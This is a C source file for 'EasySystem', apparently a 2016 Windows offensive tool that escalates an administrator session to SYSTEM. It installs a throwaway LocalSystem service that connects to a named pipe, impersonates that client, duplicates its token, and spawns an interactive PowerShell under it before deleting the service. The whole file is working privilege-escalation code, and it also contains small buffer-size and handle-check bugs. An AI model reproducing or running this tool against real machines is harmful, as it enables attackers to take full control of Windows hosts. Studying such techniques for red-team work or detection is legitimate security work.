/*
___________                      _________               __                  
\_   _____/____    _________.__./   _____/__.__. _______/  |_  ____   _____  
 |    __)_\__  \  /  ___<   |  |\_____  <   |  |/  ___/\   __\/ __ \ /     \ 
 |        \/ __ \_\___ \ \___  |/        \___  |\___ \  |  | \  ___/|  Y Y  \
/_______  (____  /____  >/ ____/_______  / ____/____  > |__|  \___  >__|_|  /
        \/     \/     \/ \/            \/\/         \/            \/      \/ 
															By Cn33liz 2016
*/

#include <windows.h>
#include <stdio.h>
#include <Userenv.h>

#pragma comment(lib, "userenv.lib")


BOOL CreateNewService()
{
	LPWSTR lpSVCName = L"svcEasySystem";
	LPWSTR lpSVCCommand = L"%COMSPEC% /C echo \"Who's your daddy :)\" > \\\\.\\pipe\\EasySystem";

	SC_HANDLE serviceDbHandle = OpenSCManager(
		NULL,                    // Local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // Full Access rights 

	if (NULL == serviceDbHandle)
	{
		wprintf(L"[!] Failed to connect to the Service Control Manager (SCM).\n");
		return FALSE;
	}

	SC_HANDLE schService = CreateService(
		serviceDbHandle,           // SCM database 
		lpSVCName,                 // Name of service 
		lpSVCName,                 // Service name to display 
		SERVICE_ALL_ACCESS,        // Desired access 
		SERVICE_WIN32_OWN_PROCESS, // Service type 
		SERVICE_DEMAND_START,      // Start type 
		SERVICE_ERROR_NORMAL,      // Error control type 
		lpSVCCommand,              // Path to service's binary 
		NULL,                      // No load ordering group 
		NULL,                      // No tag identifier 
		NULL,                      // No dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // No password 

	if (schService == NULL)
	{
		wprintf(L"[!] Failed to Create Service, error: (%d)\n", GetLastError());
		CloseServiceHandle(serviceDbHandle);
		return FALSE;
	}

	wprintf(L"[*] Pipe Client Service installed successfully.\n");

	SC_HANDLE serviceHandle = OpenService(serviceDbHandle, lpSVCName, SC_MANAGER_ALL_ACCESS);

	wprintf(L"[*] Starting Pipe Client Service.\n");

	StartService(serviceHandle, 0, 0); // Start the Service

	if (!DeleteService(serviceHandle))
	{
		wprintf(L"[!] Failed to remove Service, error: (%d)\n", GetLastError());
	}

	wprintf(L"[*] Removed Pipe Service successfully.\n");

	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(serviceDbHandle);

	return TRUE;
}


DWORD WINAPI NamedPipeServer(LPVOID lpParam)
{
	HANDLE hPipe;
	HANDLE hToken, hPrimaryToken;

	// Create a Named Pipe to send or receive data
	hPipe = CreateNamedPipe(
		L"\\\\.\\pipe\\EasySystem",	// Name of the Pipe
		PIPE_ACCESS_DUPLEX,			// Duplex pipe -- Send and receive
		PIPE_TYPE_BYTE,				// Send data as a byte stream
		PIPE_UNLIMITED_INSTANCES,	// Unlimited Instances
		0,							// No outbound buffer
		0,							// No inbound buffer
		0,							// Use default wait time
		NULL						// Use default security attributes
		);

	if (hPipe == NULL || hPipe == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] Failed to create outbound Pipe instance.\n");
		return 1;
	}

	wprintf(L"[*] Waiting for a client to connect to the Pipe.\n");

	// This call blocks until a client process connects to the Pipe
	BOOL result = ConnectNamedPipe(hPipe, NULL);
	if (!result) {
		wprintf(L"[!] Failed to make connection on Named Pipe.\n");
		CloseHandle(hPipe);
		return 1;
	}

	wprintf(L"[*] Pipe Client connected -> Reading data from the Pipe.\n");

	// The read operation will block until there is data to read
	CHAR buffer[128];
	DWORD numBytesRead = 0;
	result = ReadFile(
		hPipe,
		buffer,					// the data from the pipe will be put here
		127 * sizeof(wchar_t),	// number of bytes allocated
		&numBytesRead,			// this will store number of bytes actually read
		NULL					// not using overlapped IO
		);

	if (result) {
		buffer[numBytesRead / sizeof(char)] = '\0'; // null terminate the string
		wprintf(L"[*] Number of bytes read: %d \n", numBytesRead);
		wprintf(L"[*] Our buffer contains: %hs \n", buffer);
	}
	else {
		wprintf(L"[*] Failed to read data from the Pipe.\n");
	}

	// Impersonate the Client.
	if (!ImpersonateNamedPipeClient(hPipe))
		wprintf(L"[!] Failed to Impersonate client, error: %d\n", GetLastError());

	wprintf(L"[*] Impersonate Named Pipe Client.\n");

	// Get an impersonation token with the client's security context.
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken))
		wprintf(L"[!] Failed to get Token, error: %d\n", GetLastError());

	wprintf(L"[*] Get Impersonation Token.\n");

	// Create an Primary token from our impersonation token
	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken);

	wprintf(L"[*] Create a Primary Token from our Impersonation Token.\n");

	// Modify token SessionId field to spawn a interactive Processes on the current desktop 
	DWORD sessionId = WTSGetActiveConsoleSessionId();
	SetTokenInformation(hPrimaryToken, TokenSessionId, &sessionId, sizeof(sessionId));

	// Get all necessary environment variables of logged in user to pass them to the process
	LPVOID lpEnvironment = NULL;
	if (!CreateEnvironmentBlock(&lpEnvironment, hPrimaryToken, FALSE))
		wprintf(L"[!] Failed to Create Environment Block, error: %d\n", GetLastError());

	// Start Process with our New token
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.lpDesktop = L"Winsta0\\default";
	sui.wShowWindow = SW_SHOW;

	wprintf(L"[*] Start PowerShell with our new Token privileges.\n");

	WCHAR szCommandLine[] = L"powershell.exe";
	if (!CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, 0,
		szCommandLine, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, 0, &sui, &pi))
		wprintf(L"[!] Failed to Create Process, error: %d\n", GetLastError());

	// Destroy Environment Block
	DestroyEnvironmentBlock(lpEnvironment);

	// End impersonation of client
	RevertToSelf();

	// Close the pipe (automatically disconnects client too)
	CloseHandle(hPipe);

	//Close Token Handles
	CloseHandle(hPrimaryToken);
	CloseHandle(hToken);

	return 0;
}

int wmain(int argc, wchar_t* argv[])
{
	DWORD dwThreadId, dwThreadCount = 1;
	HANDLE hThread[2];

	wprintf(L"___________                      _________               __                  				\n");
	wprintf(L"\\_   _____/____    _________.__./   _____/__.__. _______/  |_  ____   _____  			\n");
	wprintf(L" |    __)_\\__  \\  /  ___<   |  |\\_____  <   |  |/  ___/\\   __\\/ __ \\ /     \\ 		\n");
	wprintf(L" |        \\/ __ \\_\\___ \\ \\___  |/        \\___  |\\___ \\  |  | \\  ___/|  Y Y  \\	\n");
	wprintf(L"/_______  (____  /____  >/ ____/_______  / ____/____  > |__|  \\___  >__|_|  /			\n");
	wprintf(L"        \\/     \\/     \\/ \\/            \\/\\/         \\/            \\/      \\/ 	\n");
	wprintf(L"                 					   By Cn33liz 2016  									\n");

	wprintf(L"[*] Creating an instance of a Named Pipe.\n");

	// Creating a MultiThreaded Named Pipe server (In this case only a single Thread)
	for (unsigned int i = 0; i < dwThreadCount; i++) {
		// Create Threads for the Clients
		hThread[i] = CreateThread(
			NULL,				// Default security attributes
			0,					// Use default stack size
			NamedPipeServer,	// Thread function
			NULL,				// Argument to thread function
			0,					// Use default creation flags
			&dwThreadId);		// Returns the thread identifier

		wprintf(L"[*] Server Thread with ID: %d created.\n", dwThreadId);

		if (hThread == NULL) {
			wprintf(L"[!] CreateThread() failed, error: %d.\n", GetLastError());
			return 1;
		}
	}

	// Let's Create and Start a Service which should connect to our Pipe
	if (!CreateNewService()) {
		wprintf(L"[!] Are you sure you have Administrator permission?\n");
	}

	// Waiting for Threads to finish
	for (unsigned int i = 0; i < dwThreadCount; i++) {
		WaitForSingleObject(hThread[i], 2000);
		dwThreadId = GetThreadId(hThread[i]);
		if (CloseHandle(hThread[i]) != 0)
			wprintf(L"[*] Handle to Thread ID : %d closed successfully.\n", dwThreadId);
	}

	wprintf(L"\n[*] Done\n\n");

	return 0;
}
